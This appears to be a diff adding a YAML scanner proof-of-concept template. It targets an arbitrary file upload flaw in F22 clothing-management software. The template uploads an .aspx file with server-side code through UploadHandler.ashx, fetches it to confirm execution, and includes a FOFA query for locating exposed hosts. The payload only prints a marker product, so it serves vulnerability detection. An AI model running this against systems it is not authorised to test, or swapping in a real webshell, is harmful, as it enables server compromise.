@@ -1,0 +1,50 @@
+id: poc-yaml-f22-cutesoft-client-uploadhandler-upload
+info:
+  name: F22服装管理软件系统UploadHandler.ashx任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: F22服装管理软件系统
+  fofa: body="F22WEB登陆"
+variables:
+  randstr: to_lower(random_str(27))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /CuteSoft_Client/UploadHandler.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----------{{.randstr}}
+  data: '------------{{.randstr}}
+
+    Content-Disposition: form-data; name="folder"
+
+
+    /upload/udplog
+
+    ------------{{.randstr}}
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    This website has a vulnerability!!! <% response.write( {{.t1}} * {{.t2}}) %>
+
+    ------------{{.randstr}}
+
+    Content-Disposition: form-data; name="Upload"
+
+
+    Submit Query
+
+    ------------{{.randstr}}--'
+  expression: status_code == 200
+  output:
+  - regex_match(body, "1,(?P<filename>.*?).aspx")
+- method: GET
+  path: /upload/udplog/{{.filename}}.aspx
+  expression: "status_code == 200 && \ncontains(body,t3) && \ncontains(body,\"This\
+    \ website has a vulnerability!!!\")\n"
+transport: http
